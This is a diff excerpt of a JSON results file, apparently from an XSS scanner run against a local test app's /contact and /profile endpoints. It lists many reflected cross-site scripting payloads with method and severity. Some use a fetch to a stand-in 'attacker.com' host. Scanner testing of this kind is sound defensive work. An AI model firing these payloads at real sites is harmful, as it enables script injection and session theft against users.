+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<textarea autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<select autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<keygen autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<math href='javascript:alert(1)'>CLICK</math>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<svg><animate onbegin=alert(1) attributeName=x></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<img src=# onmouseover=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<a href=javascript:alert(1)>CLICK</a>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<isindex action=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<form><button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<table background='javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<div onpointerover=alert(1)>MOVE</div>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<div onmouseenter=alert(1)>TEST</div>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<div onclick=alert(1)>CLICK</div>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<img dynsrc='javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<img lowsrc='javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<base href='javascript:alert(1);//'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<meta http-equiv='refresh' content='0;javascript:alert(1)'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<style>@import'javascript:alert(1)';</style>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<link rel=stylesheet href=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<xml><script>alert(1)</script></xml>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<script>confirm(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<script>prompt(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<ScRiPt>alert(1)</ScRiPt>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "javascript:alert(1)",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "';alert(1);//",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "\";alert(1);//",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<img src=x onerror=confirm(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<svg/onload=confirm(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<script>console.log(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<script>fetch('http://attacker.com')</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<iframe srcdoc='<script>alert(1)</script>'>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<video onloadstart=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<audio onloadstart=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<img src=x onerror=prompt(document.domain)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<svg><set onbegin=alert(1) attributeName=x></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<textarea onfocus=alert(1) autofocus></textarea>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<select onfocus=alert(1) autofocus></select>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<body onpageshow=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<img src=x onerror=eval('alert(1)')>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<script>setTimeout(alert,1000,1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/contact",
+        "payload": "<script>setInterval(alert,1000,1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "MEDIUM"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
         "payload": "<script>alert(1)</script>",
         "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "HIGH"
     },
     {
-        "url": "http://localhost:5000/profile?name=test",
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>alert('XSS')</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
         "payload": "<img src=x onerror=alert(1)>",
         "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "HIGH"
     },
     {
-        "url": "http://localhost:5000/profile?name=test",
-        "payload": "<svg/onload=alert(1)>",
-        "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/profile?name=test",
-        "payload": "<body onload=alert(1)>",
-        "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/profile?name=test",
-        "payload": "\"><script>alert(1)</script>",
-        "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/profile?name=test",
-        "payload": "'><script>alert(1)</script>",
-        "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/profile?name=test",
-        "payload": "<iframe src=javascript:alert(1)>",
-        "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/profile?name=test",
-        "payload": "<details open ontoggle=alert(1)>",
-        "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/profile?name=test",
-        "payload": "<marquee onstart=alert(1)>",
-        "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/profile?name=test",
-        "payload": "<video><source onerror=alert(1)>",
-        "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/profile?name=test",
-        "payload": "<audio src=x onerror=alert(1)>",
-        "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/profile?name=test",
-        "payload": "<object data=javascript:alert(1)>",
-        "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/profile?name=test",
-        "payload": "<embed src=javascript:alert(1)>",
-        "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
-    },
-    {
-        "url": "http://localhost:5000/profile?name=test",
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
         "payload": "<img src=1 onerror=alert(document.domain)>",
         "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "HIGH"
     },
     {
-        "url": "http://localhost:5000/profile?name=test",
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<svg/onload=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
         "payload": "<svg><script>alert(1)</script></svg>",
         "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "HIGH"
     },
     {
-        "url": "http://localhost:5000/profile?name=test",
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<body onload=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "\"><script>alert(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "'><script>alert(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<details open ontoggle=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<marquee onstart=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<video><source onerror=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<audio src=x onerror=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<object data=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<embed src=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
         "payload": "<input autofocus onfocus=alert(1)>",
         "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "HIGH"
     },
     {
-        "url": "http://localhost:5000/profile?name=test",
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
         "payload": "<textarea autofocus onfocus=alert(1)>",
         "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "HIGH"
     },
     {
-        "url": "http://localhost:5000/profile?name=test",
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
         "payload": "<select autofocus onfocus=alert(1)>",
         "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "HIGH"
     },
     {
-        "url": "http://localhost:5000/profile?name=test",
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
         "payload": "<keygen autofocus onfocus=alert(1)>",
         "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "HIGH"
     },
     {
-        "url": "http://localhost:5000/profile?name=test",
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
         "payload": "<math href='javascript:alert(1)'>CLICK</math>",
         "method": "URL_PARAMETER",
-        "type": "Reflected XSS"
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<svg><animate onbegin=alert(1) attributeName=x></svg>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img src=# onmouseover=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<a href=javascript:alert(1)>CLICK</a>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<isindex action=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<form><button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<table background='javascript:alert(1)'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<div onpointerover=alert(1)>MOVE</div>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<div onmouseenter=alert(1)>TEST</div>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<div onclick=alert(1)>CLICK</div>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img dynsrc='javascript:alert(1)'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img lowsrc='javascript:alert(1)'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<base href='javascript:alert(1);//'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<meta http-equiv='refresh' content='0;javascript:alert(1)'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<style>@import'javascript:alert(1)';</style>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<link rel=stylesheet href=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<xml><script>alert(1)</script></xml>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>confirm(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>prompt(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<ScRiPt>alert(1)</ScRiPt>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "javascript:alert(1)",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "';alert(1);//",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "\";alert(1);//",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img src=x onerror=confirm(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<svg/onload=confirm(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>console.log(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>fetch('http://attacker.com')</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<iframe srcdoc='<script>alert(1)</script>'>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<video onloadstart=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<audio onloadstart=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img src=x onerror=prompt(document.domain)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<svg><set onbegin=alert(1) attributeName=x></svg>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<button formaction=javascript:alert(1)>CLICK</button>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<textarea onfocus=alert(1) autofocus></textarea>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<select onfocus=alert(1) autofocus></select>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<body onpageshow=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img src=x onerror=eval('alert(1)')>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>setTimeout(alert,1000,1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>setInterval(alert,1000,1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<script>alert('XSS')</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img src=x onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img src=1 onerror=alert(document.domain)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<svg/onload=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<svg><script>alert(1)</script></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<body onload=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "\"><script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "'><script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<details open ontoggle=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<marquee onstart=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<video><source onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<audio src=x onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<object data=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<embed src=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<input autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<textarea autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<select autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<keygen autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<math href='javascript:alert(1)'>CLICK</math>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<svg><animate onbegin=alert(1) attributeName=x></svg>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<img src=# onmouseover=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
+        "url": "http://127.0.0.1:5000/profile?name=test&city=Delhi",
+        "payload": "<a href=javascript:alert(1)>CLICK</a>",
+        "method": "post",
+        "type": "Reflected XSS",
+        "severity": "HIGH"
+    },
+    {
